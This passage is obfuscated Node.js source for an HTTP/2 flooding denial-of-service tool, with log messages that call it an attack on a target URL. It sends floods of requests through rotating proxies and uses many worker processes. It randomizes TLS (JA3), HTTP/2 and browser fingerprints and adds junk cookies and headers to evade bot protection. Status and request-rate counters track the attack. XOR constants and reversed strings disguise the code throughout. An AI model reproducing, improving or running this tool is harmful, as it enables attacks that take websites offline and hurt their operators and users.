  if (!_0x77a3ge.cookieEnabled && !cookie) {
    _0x41c54c.cookie = "";
  }
  if (_0x77a3ge.javaEnabled) {
    _0x41c54c["sec-ch-ua-java"] = "true";
  }
  if (!_0x77a3ge.online) {
    _0x41c54c["x-offline"] = "true";
  }
  return {
    header: _0x41c54c,
    newpathname: _0x616fc
  };
}
function encodeFrame(streamId, type, payload = "", flags = 889861 ^ 889861) {
  const _0x7575f = Buffer.alloc((306624 ^ 306633) + payload.length);
  _0x7575f.writeUInt32BE(payload.length << (559112 ^ 559104) | type, 538857 ^ 538857);
  _0x7575f.writeUInt8(flags, 903012 ^ 903008);
  _0x7575f.writeUInt32BE(streamId, 767383 ^ 767378);
  if (payload.length > (839166 ^ 839166)) {
    _0x7575f.set(payload, 575436 ^ 575429);
  }
  return _0x7575f;
}
function decodeFrame(data) {
  if (data.length < (815808 ^ 815817)) {
    return null;
  }
  var _0x2927b = (240223 ^ 240217) + (328396 ^ 328395);
  const _0xca4ebg = data.readUInt32BE(610329 ^ 610329);
  _0x2927b = (582594 ^ 582592) + (702168 ^ 702172);
  var _0x3c9d = (533441 ^ 533448) + (212274 ^ 212276);
  const _0xd73bf = _0xca4ebg >> (419302 ^ 419310);
  _0x3c9d = 376525 ^ 376522;
  var _0x47f57a;
  const _0xa265fb = _0xca4ebg & (693731 ^ 693532);
  _0x47f57a = (267591 ^ 267598) + (564644 ^ 564640);
  var _0xcef3b = (940333 ^ 940330) + (883428 ^ 883436);
  const _0x522a6c = data.readUInt8(190777 ^ 190781);
  _0xcef3b = (617423 ^ 617414) + (900467 ^ 900469);
  var _0x6270df = (185731 ^ 185734) + (743009 ^ 743009);
  const _0x6c33e = data.readUInt32BE(910114 ^ 910119);
  _0x6270df = "bpipnf".split("").reverse().join("");
  const _0x6f_0x2a3 = _0x522a6c & (885863 ^ 885831) ? 319215 ^ 319210 : 865412 ^ 865412;
  const _0xc9f4aa = data.subarray((323009 ^ 323016) + _0x6f_0x2a3, (605669 ^ 605676) + _0x6f_0x2a3 + _0xd73bf);
  if (_0xc9f4aa.length + _0x6f_0x2a3 != _0xd73bf) {
    return null;
  }
  return {
    streamId: _0x6c33e,
    length: _0xd73bf,
    type: _0xa265fb,
    flags: _0x522a6c,
    payload: _0xc9f4aa
  };
}
function encodeSettings(settings) {
  const _0x00c = Buffer.alloc((920870 ^ 920864) * settings.length);
  settings.forEach(([id, value], i) => {
    _0x00c.writeUInt16BE(id, i * (780264 ^ 780270));
    _0x00c.writeUInt32BE(value, i * (567178 ^ 567180) + (675592 ^ 675594));
  });
  return _0x00c;
}
function generateCiphers() {
  const _0xe8e = {
    chrome: ["652AHS_MCG_821_SEA_SLT".split("").reverse().join(""), "TLS_AES_256_GCM_SHA384", "TLS_CHACHA20_POLY1305_SHA256", "652AHS-MCG-821SEA-ASDCE-EHDCE".split("").reverse().join(""), "652AHS-MCG-821SEA-ASR-EHDCE".split("").reverse().join(""), "ECDHE-ECDSA-AES256-GCM-SHA384", "483AHS-MCG-652SEA-ASR-EHDCE".split("").reverse().join(""), "ECDHE-ECDSA-CHACHA20-POLY1305", "5031YLOP-02AHCAHC-ASR-EHDCE".split("").reverse().join(""), "ECDHE-RSA-AES128-SHA", "ECDHE-RSA-AES256-SHA", "652AHS-MCG-821SEA".split("").reverse().join(""), "483AHS-MCG-652SEA".split("").reverse().join(""), "AHS-821SEA".split("").reverse().join(""), "AHS-652SEA".split("").reverse().join("")],
    firefox: ["TLS_AES_128_GCM_SHA256", "652AHS_5031YLOP_02AHCAHC_SLT".split("").reverse().join(""), "483AHS_MCG_652_SEA_SLT".split("").reverse().join(""), "652AHS-MCG-821SEA-ASDCE-EHDCE".split("").reverse().join(""), "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "5031YLOP-02AHCAHC-ASR-EHDCE".split("").reverse().join(""), "483AHS-MCG-652SEA-ASDCE-EHDCE".split("").reverse().join(""), "ECDHE-RSA-AES256-GCM-SHA384", "ECDHE-ECDSA-AES256-SHA384", "483AHS-652SEA-ASR-EHDCE".split("").reverse().join(""), "652AHS-821SEA-ASDCE-EHDCE".split("").reverse().join(""), "652AHS-821SEA-ASR-EHDCE".split("").reverse().join("")],
    safari: ["652AHS_MCG_821_SEA_SLT".split("").reverse().join(""), "483AHS_MCG_652_SEA_SLT".split("").reverse().join(""), "TLS_CHACHA20_POLY1305_SHA256", "652AHS-MCG-821SEA-ASDCE-EHDCE".split("").reverse().join(""), "652AHS-MCG-821SEA-ASR-EHDCE".split("").reverse().join(""), "483AHS-MCG-652SEA-ASDCE-EHDCE".split("").reverse().join(""), "483AHS-MCG-652SEA-ASR-EHDCE".split("").reverse().join(""), "5031YLOP-02AHCAHC-ASDCE-EHDCE".split("").reverse().join(""), "ECDHE-RSA-CHACHA20-POLY1305", "AES128-GCM-SHA256", "AES256-GCM-SHA384"]
  };
  var _0x625a7b;
  const _0xa2_0x38a = ["emorhc".split("").reverse().join(""), "xoferif".split("").reverse().join(""), "safari"];
  _0x625a7b = (685447 ^ 685440) + (380728 ^ 380734);
  const _0x21996e = _0xa2_0x38a[Math.floor(Math.random() * _0xa2_0x38a.length)];
  return _0xe8e[_0x21996e].join(":");
}
let version = 655095 ^ 654995;
let statuses = {};
const statusesQ = [];
var _0x2_0xbed = (916552 ^ 916558) + (862179 ^ 862186);
let yasinpidora1 = 147384 ^ 136415;
_0x2_0xbed = (244175 ^ 244169) + (731463 ^ 731470);
var _0x3543a = (843208 ^ 843209) + (753585 ^ 753585);
let yasinpidora4 = 361826 ^ 381868;
_0x3543a = 762095 ^ 762095;
let yasinpidora6 = 808575 ^ 817446;
// TOLOOK
setInterval(() => version++, 856520 ^ 858736);
function generateJA3Fingerprint() {
  var _0x4bf6a = (579570 ^ 579575) + (942008 ^ 942011);
  const _0xg8f = ["TLSv1.2", "3.1vSLT".split("").reverse().join("")];
  _0x4bf6a = 683890 ^ 683899;
  const _0x3e1ac = ["652AHS_MCG_821_SEA_SLT".split("").reverse().join(""), "483AHS_MCG_652_SEA_SLT".split("").reverse().join(""), "TLS_CHACHA20_POLY1305_SHA256", "652AHS-MCG-821SEA-ASDCE-EHDCE".split("").reverse().join(""), "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-ECDSA-AES256-GCM-SHA384", "483AHS-MCG-652SEA-ASR-EHDCE".split("").reverse().join(""), "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-CHACHA20-POLY1305", "AHS-821SEA-ASR-EHDCE".split("").reverse().join(""), "ECDHE-RSA-AES256-SHA", "652AHS-MCG-821SEA".split("").reverse().join(""), "AES256-GCM-SHA384", "AHS-821SEA".split("").reverse().join(""), "AHS-652SEA".split("").reverse().join("")];
  const _0x71cd3d = ["server_name", "terces_retsam_dednetxe".split("").reverse().join(""), "ofni_noitaitogener".split("").reverse().join(""), "supported_groups", "ec_point_formats", "smhtirogla_erutangis".split("").reverse().join(""), "application_layer_protocol_negotiation", "tseuqer_sutats".split("").reverse().join(""), "pmatsemit_etacifitrec_dengis".split("").reverse().join(""), "padding", "key_share", "pre_shared_key"];
  var _0x4a77a = (543440 ^ 543446) + (625418 ^ 625419);
  const _0x37cb = ["X25519", "P-256", "483-P".split("").reverse().join(""), "125-P".split("").reverse().join("")];
  _0x4a77a = (619984 ^ 619985) + (468531 ^ 468528);
  const _0xaa2e = ["ecdsa_secp256r1_sha256", "652ahs_easr_ssp_asr".split("").reverse().join(""), "rsa_pkcs1_sha256", "483ahs_1r483pces_asdce".split("").reverse().join(""), "rsa_pss_rsae_sha384", "483ahs_1sckp_asr".split("").reverse().join(""), "rsa_pss_rsae_sha512", "215ahs_1sckp_asr".split("").reverse().join("")];
  return {
    tlsVersion: _0xg8f[Math.floor(Math.random() * _0xg8f.length)],
    ciphers: _0x3e1ac.sort(() => Math.random() - 0.5).slice(663504 ^ 663504, Math.floor(Math.random() * (928874 ^ 928879)) + (627218 ^ 627223)),
    extensions: _0x71cd3d.sort(() => Math.random() - 0.5).slice(412838 ^ 412838, Math.floor(Math.random() * (882387 ^ 882390)) + (156797 ^ 156792)),
    ellipticCurves: _0x37cb.sort(() => Math.random() - 0.5).slice(651398 ^ 651398, Math.floor(Math.random() * (201410 ^ 201408)) + (763109 ^ 763108)),
    signatureAlgorithms: _0xaa2e.sort(() => Math.random() - 0.5).slice(214829 ^ 214829, Math.floor(Math.random() * (243532 ^ 243535)) + (410791 ^ 410789))
  };
}
function generateHTTP2Fingerprint() {
  const _0xf6c21c = {
    HEADER_TABLE_SIZE: [574482 ^ 578578, 423540 ^ 415348, 167602 ^ 183986, 586606 ^ 553838, 65536],
    ENABLE_PUSH: [306981 ^ 306981, 191764 ^ 191765],
    MAX_CONCURRENT_STREAMS: [135410 ^ 135318, 863454 ^ 863254, 629492 ^ 629504, 122857 ^ 121857],
    INITIAL_WINDOW_SIZE: [513672 ^ 469367, 131072, 262144, 524288],
    MAX_FRAME_SIZE: [247393 ^ 231009, 393164 ^ 360396, 65536],
    MAX_HEADER_LIST_SIZE: [679495 ^ 687687, 279839 ^ 263455, 437364 ^ 404596, 65536],
    ENABLE_CONNECT_PROTOCOL: [563761 ^ 563761, 569329 ^ 569328]
  };
  var _0xe_0xd32 = (496854 ^ 496863) + (181055 ^ 181054);
  const _0x5_0xa77 = {};
  _0xe_0xd32 = "gknchn".split("").reverse().join("");
  for (const [key, values] of Object.entries(_0xf6c21c)) {
    _0x5_0xa77[key] = values[Math.floor(Math.random() * values.length)];
  }
  return _0x5_0xa77;
}
function generateBrowserFingerprint() {
  const _0x289b8e = ["1920x1080", "1366x768", "468x6351".split("").reverse().join(""), "1440x900", "027x0821".split("").reverse().join(""), "2560x1440", "3840x2160"];
  const _0x6_0xa68 = [515666 ^ 515658, 101074 ^ 101068, 190234 ^ 190250];
  const _0x5229af = ["kroY_weN/aciremA".split("").reverse().join(""), "America/Los_Angeles", "nodnoL/eporuE".split("").reverse().join(""), "siraP/eporuE".split("").reverse().join(""), "oykoT/aisA".split("").reverse().join(""), "Asia/Shanghai", "yendyS/ailartsuA".split("").reverse().join("")];
  const _0xbfcd = ["en-US", "en-GB", "fr-FR", "de-DE", "es-ES", "it-IT", "pt-BR", "ru-RU", "ja-JP", "zh-CN", "RK-ok".split("").reverse().join("")];
  return {
    screenResolution: _0x289b8e[Math.floor(Math.random() * _0x289b8e.length)],
    colorDepth: _0x6_0xa68[Math.floor(Math.random() * _0x6_0xa68.length)],
    timezone: _0x5229af[Math.floor(Math.random() * _0x5229af.length)],
    language: _0xbfcd[Math.floor(Math.random() * _0xbfcd.length)],
    hardwareConcurrency: Math.pow(404518 ^ 404516, Math.floor(Math.random() * (752974 ^ 752970)) + (739997 ^ 739999)),
    deviceMemory: Math.pow(149490 ^ 149488, Math.floor(Math.random() * (858277 ^ 858273)) + (499330 ^ 499328))
  };
}
function startRequest() {
  try {
    if (!Array.isArray(proxies) || proxies.length === (560742 ^ 560742)) {
      console.log("求请起发法无，空为组数理代 :误错 ]![".split("").reverse().join(""));
      return;
    }
    var _0x5c2a4d = (340745 ^ 340744) + (364422 ^ 364431);
    const _0xaa8a = proxies[~~(Math.random() * proxies.length)];
    _0x5c2a4d = 532460 ^ 532462;
    if (!_0xaa8a || !_0xaa8a.includes(":")) {
      console.log(`[!] 错误: 无效的代理格式 "${_0xaa8a}"`);
      return;
    }
    if (process.env.DEBUG_MODE === "true") {
      console.log(`[DEBUG] 使用代理: ${_0xaa8a}`);
    }
    const [proxyHost, proxyPort] = _0xaa8a.split(":");
    const _0x059d7d = Number(proxyPort);
    if (isNaN(_0x059d7d) || _0x059d7d < (985271 ^ 985271) || _0x059d7d > (812446 ^ 825953)) {
      return;
    }
    var _0x8712bf;
    let _0x2d2f5g;
    _0x8712bf = (211667 ^ 211667) + (788199 ^ 788207);
    const _0x9a58d = generateJA3Fingerprint();
    var _0x3gb8e = (378546 ^ 378555) + (820875 ^ 820874);
    const _0x53799c = generateHTTP2Fingerprint();
    _0x3gb8e = (337754 ^ 337746) + (491360 ^ 491368);
    var _0x46e59c = (492200 ^ 492207) + (152668 ^ 152668);
    const _0xf415a = generateBrowserFingerprint();
    _0x46e59c = (436748 ^ 436748) + (568526 ^ 568520);
    var _0x8d3g = net.connect(_0x059d7d, proxyHost, () => {
      _0x8d3g.once("data", () => {
        const _0x29649d = ["2h".split("").reverse().join(""), "http/1.1"];
        const _0xa3g9cf = _0x29649d[Math.floor(Math.random() * _0x29649d.length)];
        _0x2d2f5g = tls.connect({
          socket: _0x8d3g,
          ALPNProtocols: ["2h".split("").reverse().join(""), "http/1.1"],
          servername: url.host,
          ciphers: _0x9a58d.ciphers.join(":"),
          sigalgs: _0x9a58d.signatureAlgorithms.join(":"),
          secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET | crypto.constants.SSL_OP_NO_SSLv2 | crypto.constants.SSL_OP_NO_SSLv3 | crypto.constants.SSL_OP_NO_COMPRESSION | crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION | crypto.constants.SSL_OP_TLSEXT_PADDING | crypto.constants.SSL_OP_ALL | crypto.constants.SSLcom,
          session: crypto.randomBytes(287035 ^ 287099),
          secure: true,
          rejectUnauthorized: false,
          minVersion: _0x9a58d.tlsVersion,
          maxVersion: _0x9a58d.tlsVersion,
          ecdhCurve: _0x9a58d.ellipticCurves[266110 ^ 266110]
        }, () => {
          var _0xf5242d = (593242 ^ 593241) + (993577 ^ 993576);
          let _0x76d = 275723 ^ 275722;
          _0xf5242d = (308991 ^ 308988) + (993546 ^ 993546);
          var _0xd3715e;
          let _0xeb3fa = 634845 ^ 634844;
          _0xd3715e = "bhejai";
          let _0x2a2f1c = Buffer.alloc(276366 ^ 276366);
          var _0x70bb;
          let _0x5aa8e = new HPACK();
          _0x70bb = "eijhop".split("").reverse().join("");
          _0x5aa8e.setTableSize(_0x53799c.HEADER_TABLE_SIZE);
          var _0x68b5b = (767196 ^ 767188) + (885097 ^ 885097);
          const _0x8a_0x410 = Buffer.alloc(607481 ^ 607485);
          _0x68b5b = (574157 ^ 574154) + (398445 ^ 398440);
          _0x8a_0x410.writeUInt32BE(_0x53799c.INITIAL_WINDOW_SIZE, 523443 ^ 523443);
          const _0x854e = [Buffer.from(PREFACE, "binary"), encodeFrame(219402 ^ 219402, 883053 ^ 883049, encodeSettings([[518892 ^ 518893, _0x53799c.HEADER_TABLE_SIZE], [691104 ^ 691106, _0x53799c.ENABLE_PUSH], [439262 ^ 439261, _0x53799c.MAX_CONCURRENT_STREAMS], [629344 ^ 629348, _0x53799c.INITIAL_WINDOW_SIZE], [535086 ^ 535083, _0x53799c.MAX_FRAME_SIZE], [326286 ^ 326280, _0x53799c.MAX_HEADER_LIST_SIZE], [414316 ^ 414308, _0x53799c.ENABLE_CONNECT_PROTOCOL]])), encodeFrame(269724 ^ 269724, 784106 ^ 784098, _0x8a_0x410)];
          _0x2d2f5g.on("atad".split("").reverse().join(""), eventData => {
            _0x2a2f1c = Buffer.concat([_0x2a2f1c, eventData]);
            while (_0x2a2f1c.length >= (673672 ^ 673665)) {
              var _0x78ad = (928419 ^ 928416) + (466523 ^ 466527);
              const _0xe3dae = decodeFrame(_0x2a2f1c);
              _0x78ad = (378502 ^ 378511) + (747497 ^ 747498);
              if (_0xe3dae != null) {
                _0x2a2f1c = _0x2a2f1c.subarray(_0xe3dae.length + (699652 ^ 699661));
                if (_0xe3dae.type == (603526 ^ 603522) && _0xe3dae.flags == (646434 ^ 646434)) {
                  _0x2d2f5g.write(encodeFrame(301077 ^ 301077, 374582 ^ 374578, "", 627618 ^ 627619));
                }
                if (_0xe3dae.type == (433395 ^ 433394)) {
                  const _0x34c = _0x5aa8e.decode(_0xe3dae.payload).find(x => x[452914 ^ 452914] == "sutats:".split("").reverse().join(""))[451780 ^ 451781];
                  if (_0x34c === (512415 ^ 512012)) {
                    _0x2d2f5g.end();
                  }
                  if (!statuses[_0x34c]) {
                    statuses[_0x34c] = 220361 ^ 220361;
                  }
                  statuses[_0x34c]++;
                  if (process.env.DEBUG_MODE === "true") {
                    console.log(`[DEBUG] 收到状态码: ${_0x34c} (总计: ${statuses[_0x34c]})`);
                  }
                }
                if (_0xe3dae.type == (690349 ^ 690346) || _0xe3dae.type == (694030 ^ 694027)) {
                  if (_0xe3dae.type == (711171 ^ 711172)) {
                    if (!statuses.GOAWAY) {
                      statuses.GOAWAY = 261568 ^ 261568;
                    }
                    statuses.GOAWAY++;
                    if (process.env.DEBUG_MODE === "true") {
                      console.log(`[DEBUG] 收到GOAWAY帧 (总计: ${statuses.GOAWAY})`);
                    }
                  }
                  _0x2d2f5g.end();
                }
              } else {
                break;
              }
            }
          });
          _0x2d2f5g.write(Buffer.concat(_0x854e));
          if (_0x2d2f5g && !_0x2d2f5g.destroyed && _0x2d2f5g.writable) {
            for (let i = 367725 ^ 367725; i < ratelimit; i++) {
              var _0x99bfba = (795422 ^ 795416) + (506953 ^ 506954);
              const _0xdd0c = [...Array(625727 ^ 625717)].map(() => Math.random().toString(640287 ^ 640315).charAt(737407 ^ 737405)).join("");
              _0x99bfba = (482390 ^ 482399) + (648879 ^ 648870);
              if (process.env.DEBUG_MODE === "true") {
                console.log(`[DEBUG] 请求使用Cookie: ${cookie ? cookie.length > (135159 ^ 135145) ? cookie.substring(355544 ^ 355544, 940568 ^ 940550) + "..." : cookie : "无"}`);
                console.log(`[DEBUG] 请求使用UserAgent: ${userAgent ? userAgent.length > (945933 ^ 945939) ? userAgent.substring(924601 ^ 924601, 356061 ^ 356035) + "..." : userAgent : "成生机随".split("").reverse().join("")}`);
              }
              const {
                header: header,
                newpathname: newpathname
              } = generateHeaders(url, _0x76d, 994936 ^ 994936, statuses, version, userAgent, cookie);
              const _0xb72bcg = ["session", "token", "auth", "resu".split("").reverse().join(""), "id", "track", "visit", "tsal".split("").reverse().join("")];
              const _0xed2eb = [generateRandomString(918202 ^ 918170), generateRandomString(525801 ^ 525737), generateRandomString(844315 ^ 844299), generateRandomString(162474 ^ 162482), generateRandomString(601788 ^ 601780)];
              const _0xdec9f = Math.floor(Math.random() * (717357 ^ 717358)) + (495216 ^ 495217);
              var _0x87ga;
              const _0x24cb = [];
              _0x87ga = (848414 ^ 848409) + (257274 ^ 257277);
              if (!cookie) {
                for (let j = 949031 ^ 949031; j < _0xdec9f; j++) {
                  var _0xd4c2da;
                  const _0x269f = _0xb72bcg[Math.floor(Math.random() * _0xb72bcg.length)];
                  _0xd4c2da = "dqhhia";
                  var _0xf4349c = (367689 ^ 367695) + (890271 ^ 890262);
                  const _0x56gf9e = _0xed2eb[Math.floor(Math.random() * _0xed2eb.length)];
                  _0xf4349c = "fekebd".split("").reverse().join("");
                  _0x24cb.push(`${_0x269f}=${_0x56gf9e}`);
                }
              }
              const _0xd2ccbf = Object.entries({
                ":method": "GET",
                ":authority": url.hostname,
                ":scheme": "https",
                ":path": `${newpathname}`
              }).concat(Object.entries({
                ...header,
                ...(!cookie && !header.cookie ? {
                  cookie: _0x24cb.join("; ")
                } : {})
              }).filter(a => a[961376 ^ 961377] != null));
              const _0x9dd61f = Object.entries({
                ...(Math.random() < 0.5 && {
                  cookie: `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "ultreminikall-x": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stresserapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "streswergserapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stressewegrrapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stresrjtyserapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  wsegwegfw: `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "ultremiwegwgwnikall-x": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stresserappsdfsf-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "streswewefwegrgserapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stressherhewegrrapp-xss": `${_0xdd0c}=${_0xdd0c}`
                }),
                ...(Math.random() < 0.5 && {
                  "stresrasdsafwjtyserapp-xss": `${_0xdd0c}=${_0xdd0c}`
                })
              }).filter(a => a[890703 ^ 890702] != null);
              var _0x74db9d = (848587 ^ 848579) + (160750 ^ 160744);
              const _0x8a18cb = _0xd2ccbf.concat(_0x9dd61f);
              _0x74db9d = "ddocem".split("").reverse().join("");
              if (_0xa3g9cf === "h2") {
                var _0xaeb92e = (529570 ^ 529578) + (148703 ^ 148696);
                let _0xd3_0xb7e = Buffer.concat([Buffer.from([958305 ^ 958433, 803963 ^ 803963, 906277 ^ 906277, 627443 ^ 627443, 977104 ^ 976943]), _0x5aa8e.encode(_0x8a18cb)]);
                _0xaeb92e = 622499 ^ 622502;
                _0x2d2f5g.write(Buffer.concat([encodeFrame(_0x76d, 668725 ^ 668724, _0xd3_0xb7e, 916158 ^ 916159 | 482093 ^ 482089 | 423833 ^ 423865)]));
                if (_0xeb3fa >= (208639 ^ 208634) && (_0xeb3fa - (697314 ^ 697319)) % (908853 ^ 908863) === (821611 ^ 821611)) {
                  _0x2d2f5g.write(Buffer.concat([encodeFrame(_0x76d, 126851 ^ 126848, Buffer.from([811615 ^ 811615, 720649 ^ 720649, 320962 ^ 320970, 107702 ^ 107702]), 155438 ^ 155438)]));
                }
                _0xeb3fa += 331286 ^ 331284;
                _0x76d += 328561 ^ 328563;
              } else {
                const _0x7_0xb3b = _0xd2ccbf.map(([name, value]) => `${name}: ${value}`).join("\n\r".split("").reverse().join(""));
                var _0xbd76af = (794390 ^ 794386) + (871466 ^ 871468);
                const _0x424da = `GET ${newpathname} HTTP/1.1\r\n${_0x7_0xb3b}\r\n\r\n`;
                _0xbd76af = "lajmcm".split("").reverse().join("");
                _0x2d2f5g.write(_0x424da);
              }
            }
          }
        });
        _0x2d2f5g.on("error", error => _0xa85d(error));
        _0x2d2f5g.on("close", () => _0xa85d());
      });
      _0x8d3g.write(`CONNECT ${url.host}:443 HTTP/1.1\r\nHost: ${url.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });
    _0x8d3g.on("rorre".split("").reverse().join(""), error => {
      _0xa85d();
    });
    _0x8d3g.on("close", () => {
      _0xa85d();
    });
    function _0xa85d(error) {
      if (error && process.env.DEBUG_MODE === "eurt".split("").reverse().join("")) {
        console.log(":错出时理清 ]GUBED[".split("").reverse().join(""), error);
      }
      if (_0x8d3g) {
        _0x8d3g.destroy();
        _0x8d3g = null;
      }
      if (_0x2d2f5g) {
        _0x2d2f5g.end();
        _0x2d2f5g = null;
      }
    }
  } catch (error) {
    if (process.env.DEBUG_MODE === "eurt".split("").reverse().join("")) {
      console.log(":错出tseuqeRtrats ]GUBED[".split("").reverse().join(""), error);
    }
    cleanup();
  }
}
if (cluster.isMaster) {
  const workers = {};
  const CPUS = os.cpus().length;

  // 最大 worker 数
  const maxWorkers = threads;

  // 分批参数
  const BATCH_SIZE = Math.min(CPUS * 2, 32);
  const BATCH_DELAY = 100;

  async function startWorkersInBatches() {
    for (let batch = 0; batch < Math.ceil(maxWorkers / BATCH_SIZE); batch++) {
      const start = batch * BATCH_SIZE;
      const end = Math.min(start + BATCH_SIZE, maxWorkers);

      for (let i = start; i < end; i++) {
        cluster.fork({
          core: i % CPUS,
          workerId: i
        });
      }

      // 延迟启动下一批
      if (batch < Math.ceil(maxWorkers / BATCH_SIZE) - 1) {
        await new Promise(resolve => setTimeout(resolve, BATCH_DELAY));
      }
    }
  }

  // 启动 workers
  startWorkersInBatches().catch(console.error);

  if (process.env.DEBUG_MODE === "true") {
    console.log(`\n===== HTTP/2 Flooder 配置 =====`);
    console.log(`目标URL: ${target}`);
    console.log(`攻击时间: ${time}秒`);
    console.log(`线程数: ${threads}`);
    console.log(`速率限制: ${ratelimit}请求/线程`);
    console.log(
      `代理: ${typeof proxy === "string" ? proxy : proxies.length + " 个代理"}`
    );
    if (cookie) {
      console.log(
        `Cookie: ${
          cookie.length > 14 ? cookie.substring(0, 14) + "..." : cookie
        }`
      );
    }
    if (userAgent) {
      console.log(
        `User-Agent: ${
          userAgent.length > 46 ? userAgent.substring(0, 14) + "..." : userAgent
        }`
      );
    }
    console.log(`==============================\n`);
  }

  console.log(
    `[HTTP/2]: Started attack on ${target} (${time}s, ${threads} threads, ${ratelimit} req/thread)`
  );
  console.log(
    `[HTTP/2]: Using ${typeof proxy === "string" ? proxy : proxies.length + " proxies"}`
  );
  console.log(`[HTTP/2]: Attack in progress...`);

  cluster.on("exit", worker => {
    setTimeout(() => {
      cluster.fork({
        core: worker.id % CPUS
      });
    }, 500);
  });

  cluster.on("message", (worker, message) => {
    workers[worker.id] = [worker, message];
  });
  var _0x97ef;
  const startTime = Date.now();
  _0x97ef = "ccpnpc".split("").reverse().join("");
  var _0x8700ed = (402364 ^ 402363) + (700764 ^ 700764);
  let lastOutputTime = Date.now();
  _0x8700ed = 777713 ^ 777712;
  var _0x33653g = (665706 ^ 665705) + (760085 ^ 760083);
  let lastTotalRequests = 641028 ^ 641028;
  _0x33653g = 882537 ^ 882538;
  let outputInterval = 200025 ^ 204497;
  if (process.env.STATUS_INTERVAL) {
    const interval = parseInt(process.env.STATUS_INTERVAL, 631068 ^ 631062);
    if (!isNaN(interval) && interval > (406316 ^ 406316)) {
      outputInterval = interval * (602997 ^ 602269);
    }
  }
  // TOLOOK
  setInterval(() => {
    let statusCodes = {};
    let totalRequests = 415416 ^ 415416;
    for (let w in workers) {
      if (workers[w][419917 ^ 419917].state == "online") {
        for (let st of workers[w][260201 ^ 260200]) {
          for (let code in st) {
            if (statusCodes[code] == null) {
              statusCodes[code] = 967521 ^ 967521;
            }
            statusCodes[code] += st[code];
            if (code !== "GOAWAY") {
              totalRequests += st[code];
            }
          }
        }
      }
    }
    const currentTime = Date.now();
    const timeElapsed = (currentTime - lastOutputTime) / (448942 ^ 449094);
    var _0x449fb;
    const requestsInInterval = totalRequests - lastTotalRequests;
    _0x449fb = (278170 ^ 278170) + (177166 ^ 177165);
    const currentRps = Math.floor(requestsInInterval / timeElapsed);
    var _0x7843fa = (210472 ^ 210464) + (780981 ^ 780983);
    const totalElapsedSeconds = Math.max(372052 ^ 372053, Math.floor((currentTime - startTime) / (385770 ^ 385282)));
    _0x7843fa = (560319 ^ 560314) + (661655 ^ 661662);
    const averageRps = Math.floor(totalRequests / totalElapsedSeconds);
    if (currentTime - lastOutputTime >= outputInterval) {
      lastOutputTime = currentTime;
      console.log(`[Status]: ${JSON.stringify(statusCodes)}`);
      console.log(`Requests: ${totalRequests} | RPS: ${currentRps}/s`);
    }
    lastTotalRequests = totalRequests;
  }, 379877 ^ 378893);
  // TOLOOK
  setTimeout(() => {
    process.exit(360887 ^ 360886);
  }, time * (705209 ^ 704849));
} else {
  // TOLOOK
  setInterval(() => {
    startRequest();
  });
  // TOLOOK
  setInterval(() => {
    if (statusesQ.length >= (756586 ^ 756590)) {
      statusesQ.shift();
    }
    statusesQ.push(statuses);
    statuses = {};
    try {
      if (process.connected) {
        process.send(statusesQ);
      }
    } catch (error) {
      if (process.env.DEBUG_MODE === "eurt".split("").reverse().join("")) {
        console.log("[DEBUG] 发送状态数据时出错:", error.message);
      }
    }
  }, 989244 ^ 990090);
  // TOLOOK
  setTimeout(() => process.exit(625636 ^ 625637), time * (995361 ^ 996297));
}
